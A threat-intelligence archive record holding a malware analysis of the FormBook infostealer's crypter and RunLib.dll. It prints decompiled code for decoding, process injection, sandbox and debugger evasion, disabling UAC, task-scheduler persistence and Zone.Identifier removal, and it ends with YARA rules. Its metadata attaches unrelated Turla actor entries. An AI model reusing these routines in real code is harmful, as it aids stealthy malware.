{
    "id": "d6e79bac-e9bb-46fa-8bc4-bddd8057ee57",
    "created_at": "2023-01-12T15:10:57.169235Z",
    "updated_at": "2025-03-27T02:05:33.705591Z",
    "deleted_at": null,
    "sha1_hash": "8735a3c049fb67cc9d27859e8f2e04ec13104b52",
    "title": "2018-01-29 - Let's Learn- Dissecting FormBook Infostealer Malware- Crypter & -RunLib.dll-",
    "authors": "",
    "file_creation_date": "2022-05-28T04:12:32Z",
    "file_modification_date": "2022-05-28T04:12:32Z",
    "file_size": 293963,
    "plain_text": "# Let's Learn: Dissecting FormBook Infostealer Malware: Crypter & \"RunLib.dll\"\n\n**vkremez.com/2018/01/lets-learn-dissecting-formbook.html**\n\n**Goal: Dissect and outline the main functions of FormBook crypter and its RunLib main injection DLL.**\n\n**Source:**\n\n[Packed Original Formbook (MD5: 2bf4f25d5e09822543576f2c2eb32e2d)](https://www.virustotal.com/#/file/8c6f2ebfffd5afdc10e18e13b579ed5dd3ffb8bfc3362062465fa36f60954dd8/detection)\n[Unpacked RunLib.dll (MD5: a747af029f0c00fe6090b9b64f62d339)](http://runlib.dll/)\n[Unpacked first-layer deobfuscated loader (MD5: c12f538e3f48d71586b77948b86c8e16)](https://www.virustotal.com/#/file/e4d8d6bbb80a2ddf9d4b28ac1dec354cdd59dd633e2dca13ef93b5e4fcb4abd5/detection)\n\nWhile analyzing one of the more recent #FormBook campaigns, came across an interesting FormBook\ncrypter and its \"RunLib\" DLL module.\n\n[#formbook](https://twitter.com/hashtag/formbook?src=hash&ref_src=twsrc%5Etfw) [#malspam now using xml...that's kinda neat in a crappy sorta way:https://t.co/Ie1nxJv7Zk](https://twitter.com/hashtag/malspam?src=hash&ref_src=twsrc%5Etfw)\n[pic.twitter.com/QxjaQoTWFU](https://t.co/QxjaQoTWFU)\n[— James (@James_inthe_box) January 19, 2018](https://twitter.com/James_inthe_box/status/954369930803036160?ref_src=twsrc%5Etfw)\n\n**Outline:**\n\nI. Background\n\nII. First-layer deobfuscated loader\n\nA. XOR decoding routine\n\nB. Fake MessageBox routine\n\nC. Injection\n\nD. Anti-Analysis\n\nIII. RunLib.dll\n\nA. Main injection routine\n\nB. UAC and registry disable registry function\n\nC. ElevateProcess function\n\nD. Task Scheduler persistence\n\nE. Zone.Identifier remove\n\nIV. Yara RULE\n**I. Background:**\n\nFormBook is a formgrabbing malware that is available on the underground. It continuously evolves\nleveraging VBCrypter -> RunPE packers and is written in .NET. [FireEye and](https://www.fireeye.com/blog/threat-research/2017/10/formbook-malware-distribution-campaigns.html) [Arbor extensively covered the](https://www.arbornetworks.com/blog/asert/formidable-formbook-form-grabber/)\nbinary functionality of the FormBook stealer.\n\nIt is the same crypter called internally “classicrefud.” It is also referenced as \"Prime Crypt - The Babushka\nCrypter” [1] by [InsideMalware.](http://insidemalware.xyz/Prime-Crypt/)\n\n**II. First-layer deobfuscated loader:**\n\n\n-----\n\nThe PDB path for the binary crypter is as follows:\nC:\\Users\\zeros\\OneDrive\\Documents\\Visual Studio\n2017\\projects\\classicrefud\\Classlibrary1\\Obj\\Release\\graznataguz.pdb\n**A. XOR decoding routine**\nFormBook decodes resource via the following decoding function (censored) with the static key\n\"ZTZZCVBMVUTBOMTTIZICXOVBOUIIRUUEBUEXOEEXNBUBTCBEOOCVCUEMOUNNIUOOERZROI.\"\npublic static byte[] b****k(byte[] feromero, byte[] malkopute, string golemiq)\n{\nmalkopute = Encoding.get_ASCII().GetBytes(golemiq);\nfor (int i = 0; i < feromero.Length; i++)\n{\nint expr_18_cp_1 = i;\nferomero[expr_18_cp_1] ^= (byte)(malkopute[i % golemiq.get_Length()] >> i + 5 + malkopute.Length & 150);\n}\nreturn feromero;\n}\n\n**B. Fake MessageBox routine**\nThe malware contains the fake MessageBox logic from the member function \"mb.\"\n\ntype.InvokeMember(\"mb\",256, null, Activator.CreateInstance(type), new object[]\n{\n\"[BODY]\",\n\"[TITLE]\",\n\"warning\",\n\"[MSGONCE]\"\n});\n\n**C. Injection**\nThe binary injects the decoded resource to svchost (suspended) RunPE style the payload \"SYRPSVT.exe.\"\n\n\n-----\n\ntype.InvokeMember( Inj,256,null, Activator.CreateInstance(type), new object[]\n{\narray3,\n\"svchost\",\nfalse,\nfalse,\nfalse,\n\"SYRPSVT.exe\",\nPP1PP2\n});\n**IV. Anti-analysis**\nThe malware contains various anti-analysis tricks checking for debugger, analysis tools, and emulation\nenvironment.\n**a. DWireshark()**\nprivate static bool DWireshark()\n{\nProcess[] processes = Process.GetProcesses();\nProcess[] array = processes;\nfor (int i = 0; i < array.Length; i++)\n{\nProcess process = array[i];\nif (process.get_MainWindowTitle().Equals(\"The Wireshark Network Analyzer\"))\n{\nreturn true;\n}\n}\nreturn false;\n\n}\n**b. IsDebuggerPresent()**\n\n[DllImport(\"kernel32\")]\n\nprivate static extern bool IsDebuggerPresent();\n**c. DEmulation()**\nprivate static bool DEmulation()\n{\nlong num = (long)Environment.get_TickCount();\nThread.Sleep(500);\nlong num2 = (long)Environment.get_TickCount();\nreturn num2 - num < 500L;\n}\n**d. DSandboxie()**\nprivate static bool DSandboxie()\n{\nreturn AA3.GetModuleHandle(\"SbieDll.dll\").ToInt32() != 0;\n}\n**III. RunLib DLL function**\n\n\n-----\n\n**A. Main injection routine**\nThe malware checks for Avast anti-virus and injects its code into svchost.exe; alternatively, it creates the\nprocess svcchost.exe with the argument -woohoo.\n\n**B. UAC and registry disable registry function**\nFormBook also attempts to disable UAC and registry tools via the function called internally \"dbl.\"\npublic static void dbl(bool[] dis)\n{\ntry\n{\nif (dis[0])\n{\ntry\n{\nRegistryKey expr_15 =\nRegistry.LocalMachine.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\",\ntrue);\nexpr_15.SetValue(\"EnableLUA\", \"0\");\nexpr_15.Close();\n}\ncatch\n{\n}\n}\nif (dis[2])\n{\ntry\n{\n\n\n-----\n\nRegistryKey expr_43 =\nRegistry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\nexpr_43.SetValue(\"DisableRegistryTools\", \"1\");\nexpr_43.Close();\n}\ncatch\n{\n}\n}\n}\ncatch (Exception)\n{\n}\n}\n**C. ElevateProcess function**\nThe binary also attempts to elevate process via the following function:\n\nprivate static void ElevateProcess(IntPtr handle)\n{\ntry\n\n{\nbyte[] array = new byte[0];\nuint num = 0u;\nRunLib.GetKernelObjectSecurity(handle, 4, array, 0u, ref num);\narray = new byte[num];\nRunLib.GetKernelObjectSecurity(handle, 4, array, num, ref num);\n\n**RawSecurityDescriptor expr_2F = new RawSecurityDescriptor(array, 0);**\nexpr_2F.get_DiscretionaryAcl().InsertAce(0, new CommonAce(0, 1, Convert.ToInt32(987135), new\n**SecurityIdentifier(1, null), false, null));**\narray = new byte[expr_2F.get_BinaryLength()];\nexpr_2F.GetBinaryForm(array, 0);\nRunLib.SetKernelObjectSecurity(handle, 4, array);\n}\ncatch\n{\n}\n}\n**D. Task Scheduler persistence**\n\n\n-----\n\nThe binary sets up persistence via the task scheduler XML file with its template stored in the resource\nsection. The function is called internally \"okapise.\"\npublic static void okapise(string location, string filename, string value, bool hide)\n{\n\nDirectory.CreateDirectory(Environment.GetFolderPath(26) + \"\\\\\" + value);\nstring text = string.Concat(new string[]\n{\nEnvironment.GetFolderPath(26),\n\"\\\\\",\nvalue,\n\"\\\\\",\nfilename\n});\nstring text2 = string.Concat(new string[]\n{\nEnvironment.GetFolderPath(26),\n\"\\\\\",\nvalue,\n\"\\\\\",\nRunLib.RndString(5),\n\".xml\"\n});\n\nstring name = WindowsIdentity.GetCurrent().get_Name();\nstring text3 = Resources.TE;\nif (!(location == text))\n{\nFile.Copy(location, text, true);\n}\nbool flag = (File.GetAttributes(location) & 2) == 2;\nif (hide && !flag)\n{\nFile.SetAttributes(text, File.GetAttributes(text) | 2);\n}\ntext3 = text3.Replace(\"[USERID]\", name).Replace(\"[LOCATION]\", text);\n\n\n-----\n\nFile.WriteAllText(text2, text3);\nProcessStartInfo expr_124 = new ProcessStartInfo(\"schtasks.exe\", string.Concat(new string[]\n{\n**\"/Create /TN \\\"\" + value + \"\\\\\",**\n**value,**\n**\"\\\" /XML \\\"\",**\n**text2,**\n**\"\\\"\"**\n}));\nexpr_124.set_WindowStyle(1);\nProcess.Start(expr_124).WaitForExit();\nFile.Delete(text2);\n\n}\n\n**E. Zone.Identifier**\nThe malware also modifies the flag to remove or modify Zone.Identifier to avoid additional checks that might\nshow the binary was downloaded externally.\nThe function \"remove\" is as follows:\n\nprivate static void remove(string path)\n{\ntry\n{\nRunLib.DeleteFile(path + \":Zone.Identifier\");\n}\ncatch (Exception)\n{\nRunLib.modify(0, path);\n}\n}\nThe function \"modify\" is as follows:\n\nprivate static void modify(int m, string path)\n{\ntry\n{\nProcessStartInfo expr_3A = new ProcessStartInfo(\"cmd.exe\", string.Concat(new object[]\n\n{\n\"/c echo [zoneTransfer]ZoneID = \",\nm,\n\" > \",\npath,\n**\":Zone.Identifier & exit\"**\n}));\nexpr_3A.set_WindowStyle(1);\nProcess.Start(expr_3A).WaitForExit();\nThread.Sleep(1000);\n\n\n-----\n\n}\ncatch (Exception) {\n}\n}\n\n**IX. YARA RULE**\nrule crime_win32_formbook_runlib_in_memory{\n\nmeta:\ndescription = \"Detects the FormBook's runlib DLL in memory\"\nauthor = \"@VK_Intel\"\nreference = \"Detects the unpacked FormBook RunLib\"\ndate = \"2018-01-21\"\nhash = \"a285feabf146fe4d944acc20b4d7ad2258e5084b0440960bd2b7df662e6cf7d6\"\n\nstrings:\n$s0 = \"C:\\\\Users\\\\zeros\\\\OneDrive\\\\Documents\\\\Visual Studio\n2017\\\\Projects\\\\ClassicRefud\\\\ClassLibrary1\\\\obj\\\\Release\\\\graznataguz.pdb\" fullword ascii\n$s1 = \"C:\\\\Windows\\\\System32\\\\svchost.exe\" fullword wide\n$s2 = \"\\\\System32\\\\svchost.exe\" fullword wide\n$s3 = \"RunLib\" fullword wide\n$s4 = \"<Command>[LOCATION]</Command>\" fullword wide\n$s5 = \"mscoree.dll\" ullword wide\ncondition:\nall of them\n}\n\nrule crime_win32_formbook_first_layer_unpacked {\nmeta:\ndescription = \"Detects the FormBook's main runner in memory\"\nauthor = \"@VK_Intel\"\nreference = \"Detects first-layer FormBook binary unpacked\"\ndate = \"2018-01-21\"\nhash = \"e4d8d6bbb80a2ddf9d4b28ac1dec354cdd59dd633e2dca13ef93b5e4fcb4abd5\"\nstrings:\n$s0 = \"DSandboxie\" fullword ascii\n$s1 = \"DWireshark\" fullword ascii\n$s2 = \"DEmulation\" fullword ascii\n$s3 = \"mb\" fullword ascii\n$s4 = \"svchost\" fullword ascii\ncondition:\nall of them\n}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-01-29 - Let's Learn- Dissecting FormBook Infostealer Malware- Crypter & -RunLib.dll-.pdf"
    ],
    "report_names": [
        "2018-01-29 - Let's Learn- Dissecting FormBook Infostealer Malware- Crypter & -RunLib.dll-.pdf"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536257,
    "ts_updated_at": 1743041133,
    "ts_creation_date": 1653711152,
    "ts_modification_date": 1653711152,
    "files": {
        "pdf": "https://archive.orkl.eu/8735a3c049fb67cc9d27859e8f2e04ec13104b52.pdf",
        "text": "https://archive.orkl.eu/8735a3c049fb67cc9d27859e8f2e04ec13104b52.txt",
        "img": "https://archive.orkl.eu/8735a3c049fb67cc9d27859e8f2e04ec13104b52.jpg"
    }
}